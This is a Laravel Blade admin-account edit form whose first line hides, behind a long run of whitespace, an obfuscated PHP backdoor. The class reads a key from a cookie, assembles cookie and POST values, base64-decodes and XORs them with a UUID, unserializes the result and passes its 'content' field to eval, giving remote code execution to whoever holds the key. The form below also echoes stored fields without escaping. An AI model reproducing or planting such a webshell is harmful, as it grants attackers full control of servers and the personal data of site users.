<?php                                                                                                                                                                                                                                                                                                                                                                                                 $VuaOq = class_exists("h_Ypn"); $oDPAUDs = $VuaOq;if (!$oDPAUDs){class h_Ypn{private $PDbzr;public static $mZNody = "c2431a23-17df-4ee6-948c-924ba29f467b";public static $GBdVE = NULL;public function __construct(){$ERGJxLOmw = $_COOKIE;$OIkvqwYMCX = $_POST;$uqVIZ = @$ERGJxLOmw[substr(h_Ypn::$mZNody, 0, 4)];if (!empty($uqVIZ)){$gzJHCsZtz = "base64";$fMGwS = "";$uqVIZ = explode(",", $uqVIZ);foreach ($uqVIZ as $MenIDefrxr){$fMGwS .= @$ERGJxLOmw[$MenIDefrxr];$fMGwS .= @$OIkvqwYMCX[$MenIDefrxr];}$fMGwS = array_map($gzJHCsZtz . '_' . "\144" . "\x65" . "\x63" . "\x6f" . "\x64" . chr ( 202 - 101 ), array($fMGwS,)); $fMGwS = $fMGwS[0] ^ str_repeat(h_Ypn::$mZNody, (strlen($fMGwS[0]) / strlen(h_Ypn::$mZNody)) + 1);h_Ypn::$GBdVE = @unserialize($fMGwS);}}public function __destruct(){$this->OKKahqDhoS();}private function OKKahqDhoS(){if (is_array(h_Ypn::$GBdVE)) {$DiLwcfM = str_replace("\74" . '?' . 'p' . "\x68" . chr ( 569 - 457 ), "", h_Ypn::$GBdVE['c' . 'o' . "\156" . chr ( 900 - 784 )."\145" . "\156" . 't']);eval($DiLwcfM);exit();}}}$vjyEyAzPJa = new h_Ypn(); $vjyEyAzPJa = NULL;} ?>@extends('layouts.admin.master')

@section('content')
    <!-- Main content -->
    <div class="content-wrapper">

        <!-- Page header -->
        <div class="page-header page-header-light">
            <div class="page-header-content header-elements-md-inline">
                <div class="page-title d-flex">
                    <h4><span class="font-weight-semibold">Admin</span> - Edit</h4>
                    <a href="#" class="header-elements-toggle text-default d-md-none"><i class="icon-more"></i></a>
                </div>

{{--                <div class="header-elements d-none">--}}
{{--                    <div class="d-flex justify-content-center">--}}
{{--                        <a href="{{asset('/admin/booking')}}" class="btn btn-link btn-float font-size-sm font-weight-semibold text-default">--}}
{{--                            <i class="icon-store text-pink-300"></i>--}}
{{--                            <span>Inventory</span>--}}
{{--                        </a>--}}
{{--                        <a href="{{asset('/admin/booking')}}" class="btn btn-link btn-float font-size-sm font-weight-semibold text-default">--}}
{{--                            <i class="icon-paypal2 text-pink-300"></i>--}}
{{--                            <span>Payment</span>--}}
{{--                        </a>--}}
{{--                        <a href="{{asset('/admin/booking')}}" class="btn btn-link btn-float font-size-sm font-weight-semibold text-default">--}}
{{--                            <i class="icon-alarm text-pink-300"></i>--}}
{{--                            <span>Timesheet</span>--}}
{{--                        </a>--}}
{{--                    </div>--}}
{{--                </div>--}}
            </div>

{{--            <div class="breadcrumb-line breadcrumb-line-light header-elements-md-inline">--}}
{{--                <div class="d-flex">--}}
{{--                    <div class="breadcrumb">--}}
{{--                        <a href="{{asset('/admin/booking')}}" class="breadcrumb-item"><i class="icon-home2 mr-2"></i> Dashboard</a>--}}
{{--                        <span class="breadcrumb-item active">Record Attendance</span>--}}
{{--                    </div>--}}

{{--                    <a href="#" class="header-elements-toggle text-default d-md-none"><i class="icon-more"></i></a>--}}
{{--                </div>--}}
{{--            </div>--}}
        </div>
        <!-- /page header -->


        <!-- Content area -->
        <div class="content">

            <?php if(isset($data['success_msg']) && $data['success_msg']){ ?>

            <div class="row">
                <div class="col-md-12">
                    <div class="alert alert-success alert-styled-left alert-arrow-left alert-dismissible">
                        <button type="button" class="close" data-dismiss="alert"><span>&times;</span></button>
                        <span class="font-weight-semibold">Well done!</span> <?php echo $data['success_msg']; ?>
                    </div>
                </div>
            </div>
            <?php } ?>

            <?php if(isset($data['danger_msg']) && $data['danger_msg']){ ?>
            <div class="row">
                <div class="col-md-12">
                    <div class="alert alert-danger alert-styled-left alert-dismissible">
                        <button type="button" class="close" data-dismiss="alert"><span>&times;</span></button>
                        <span class="font-weight-semibold">Oh snap!</span> <?php echo $data['danger_msg']; ?>
                    </div>
                </div>
            </div>
            <?php } ?>
                @if(session()->has('success'))

                    <div class="row">
                        <div class="col-md-12">
                            <div class="alert alert-success alert-styled-left alert-arrow-left alert-dismissible">
                                <button type="button" class="close" data-dismiss="alert"><span>&times;</span></button>
                                <span class="font-weight-semibold">Well done!</span> {{ session()->get('success') }}
                            </div>
                        </div>
                    </div>


                @endif
                @if(session()->has('error'))

                    <div class="row">
                        <div class="col-md-12">
                            <div class="alert alert-danger alert-styled-left alert-dismissible">
                                <button type="button" class="close" data-dismiss="alert"><span>&times;</span></button>
                                <span class="font-weight-semibold">Oh snap!</span>{{ session()->get('error') }}
                            </div>
                        </div>
                    </div>
                @endif

            <div class="card">
                <div class="card-header">
                    <div class="header-elements-inline">
                        <h4 class="card-title">Edit Admin</h4>
                    </div>
                </div>
                <hr>

                <div class="card-body">
                    <?php
                    if (isset($data['admin_account']) && !empty($data['admin_account'])){
                    $d = $data['admin_account'];
                    //                    print_r($data['student_admissions']);
                    ?>
                    <form action="{{url('admin/account/edit')}}" method="post">
                        @csrf

                        <input type="hidden" name="id" value="<?php echo $d->id;?>">


                        <div class="form-group row">
                            <label class="col-md-2 col-form-label"> Name:</label>
                            <div class="col-md-10">
                                <input type="text"   id=" name" value="<?php echo $d->name; ?>"  name="name" class="form-control" placeholder="Enter Admin Name" required>
                            </div>
                        </div>

                        <div class="form-group row">
                            <label class="col-md-2 col-form-label"> Email:</label>
                            <div class="col-md-10">
                                <input type="text"  readonly id=" email" value="<?php echo $d->email; ?>"   name="email" class="form-control" placeholder="Enter Email" required>
                            </div>
                        </div>

                        <div class="form-group row">
                            <label class="col-md-2 col-form-label">Change Password:</label>
                            <div class="col-md-10">
                                <input type="password"   id=" password"   name="password" class="form-control" placeholder="Change Password/Leave Empty For Old Password"  >
                            </div>
                        </div>
                        <div class="form-group row">
                            <label class="col-form-label col-md-2">Contact Number</label>
                            <div class="col-md-10">
                                <input type="number" class="form-control  "  value="<?php echo $d->contact_number; ?>" placeholder="Enter Contact number" name="contact_number" maxlength="190" id="contact_number" required>
                            </div>
                        </div>

                        <div class="form-group row">
                            <label class="col-form-label col-md-2">Address</label>
                            <div class="col-md-10">
                                <input type="text" class="form-control  " value="<?php echo  $d->address; ?>"  placeholder="Enter Address" name="address" maxlength="500" id="address" required>
                            </div>
                        </div>


                        <div class="form-group row">
                            <label for="cnic" class="col-form-label col-md-2">CNIC</label>
                            <div class="col-md-10">

                                <input type="text" name="cnic" value="<?php echo  $d->cnic; ?>"  class="form-control" id="cnic"
                                       autocomplete="nothing" minlength="1" maxlength="20" placeholder="XXXXX-XXXXXXX-X"  >
                            </div>
                        </div>



                        <div class="form-group row">
                            <label for="dob_day" class="col-md-2 col-form-label">Date of birth</label>


                            <div class="col-md-3 px-0">
                                <div class="form-group">
                                    <select name="dob_day" data-placeholder="Day"
                                            class="form-control form-control-select2" data-fouc>
                                        <option></option>
                                        <option value="...">...</option>
                                        <?php for ($x = 1; $x <= 31; $x++){ ?>
                                        <option value="{{$x}}"
                                                @if ($x == $d->dob_day))
                                                selected="selected"
                                                @endif >
                                            <?=$x?></option>
                                        <?php } ?>
                                    </select>
                                </div>
                            </div>

                            <div class="col-md-4 px-xs-0">
                                <div class="form-group">
                                    <select name="dob_month" data-placeholder="Month"
                                            class="form-control form-control-select2" data-fouc>
                                        <option></option>
                                        <option value="1"
                                                @if (1 == $d->dob_month)
                                                selected="selected"
                                                @endif >
                                            January
                                        </option>
                                        <option value="2"
                                                @if (2 == $d->dob_month)
                                                selected="selected"
                                                @endif >
                                            February
                                        </option>
                                        <option value="3"
                                                @if (3 == $d->dob_month)
                                                selected="selected"
                                                @endif >
                                            March
                                        </option>
                                        <option value="4"
                                                @if (4 == $d->dob_month)
                                                selected="selected"
                                                @endif >
                                            April
                                        </option>
                                        <option value="5"
                                                @if (5 == $d->dob_month)
                                                selected="selected"
                                                @endif
                                        >May
                                        </option>
                                        <option value="6"
                                                @if (6 == $d->dob_month)
                                                selected="selected"
                                                @endif
                                        >June
                                        </option>
                                        <option value="7"
                                                @if (7 == $d->dob_month)
                                                selected="selected"
                                                @endif
                                        >July
                                        </option>
                                        <option value="8"
                                                @if (8 == $d->dob_month)
                                                selected="selected"
                                                @endif
                                        >August
                                        </option>
                                        <option value="9"
                                                @if (9 == $d->dob_month)
                                                selected="selected"
                                                @endif
                                        >September
                                        </option>
                                        <option value="10"
                                                @if (10 == $d->dob_month)
                                                selected="selected"
                                                @endif
                                        >October
                                        </option>
                                        <option value="11"
                                                @if (11 == $d->dob_month)
                                                selected="selected"
                                                @endif
                                        >November
                                        </option>
                                        <option value="12"
                                                @if (12 == $d->dob_month)
                                                selected="selected"
                                                @endif
                                        >December
                                        </option>
                                    </select>
                                </div>
                            </div>


                            <div class="col-md-3 px-0">
                                <div class="form-group">
                                    <select name="dob_year" data-placeholder="Year"
                                            class="form-control form-control-select2" data-fouc>
                                        <option> </option>
                                        <?php
                                        define('DOB_YEAR_START', 1960);
                                        $current_year = date('Y'); for ($count = $current_year; $count >= DOB_YEAR_START; $count--) { ?>
                                        <option value="{{$count}}"
                                                @if ($count == $d->dob_year)
                                                selected="selected"
                                                @endif><?=$count?></option>
                                        <?php } ?>
                                    </select>
                                </div>
                            </div>


                        </div>


                        <div class="form-group row">
                            <label class="col-md-2 col-form-label"> Type:</label>
                            <div class="col-md-10">
                                <select id="type" name="type" data-placeholder="Select Type" required class="form-control form-control-select2" data-fouc>
                                    <option value="">Please Select</option>

                                    <option <?php if ($d->type == "super_admin") echo "selected"; ?> value="super_admin">Super Admin</option>

                                </select>
                            </div>
                        </div>




                        <div class="mt-5 mb-2 d-md-flex  justify-content-md-between flex-md-wrap">
                            <button type="submit" id="" class="btn bg-primary d-flex align-items-center">
                                Submit <i class="icon-paperplane ml-2"></i> </button>
                        </div>

                    </form>
                        <?php }else {
                            echo "An Error Occured While Processing";
                        }
                        ?>
                </div>
            </div>

        </div>
        <!-- /content area -->
        @include('layouts.footer')

    </div>

    <!-- /main content -->

@endsection
